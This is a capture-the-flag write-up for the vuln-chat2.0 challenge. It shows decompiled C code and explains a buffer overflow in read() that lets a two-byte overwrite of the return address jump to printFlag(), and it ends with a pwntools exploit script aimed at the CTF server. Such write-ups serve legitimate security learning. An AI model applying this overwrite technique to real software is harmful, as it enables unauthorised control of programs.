# Writeup Of AceBear Team

First, use IDA pro to view source code i have:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0x14u);
  doThings();
  return 0;
}
```
```C
int doThings()
{
  char buf; // [esp+1h] [ebp-27h]
  char v2; // [esp+15h] [ebp-13h]

  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf("%15s", &v2);
  printf("Welcome %s!\n", &v2);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: You've proven yourself to me. What information do you need?");
  printf("%s: ", &v2);
  read(0, &buf, 0x2Du);
  puts("djinn: Alright here's you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  return puts("djinn: Wait thats not right...");
}
```
```C
int printFlag()
{
  puts("Ah! Found it");
  system("/bin/cat ./flag.txt");
  return puts("Don't let anyone get ahold of this");
}
```
In `doThings()`, when i input infomation `read(0, &buf, 0x2Du);` i can overwrite 2 byte of return address.
In this case old value of return address is `0x08048668`, i can overwrite to `0x08048672`, which is address of 'printFlag()`

```py
from pwn import *
from time import *

r = remote('vulnchat2.tuctf.com', 4242)
# r = process('./vuln-chat2.0')
# gdb.attach(r, )
r.recvuntil('Enter your username: ')
r.sendline('a')
sleep(1)
r.send('a'*0x2b+'\x72\x86')
r.interactive()
```
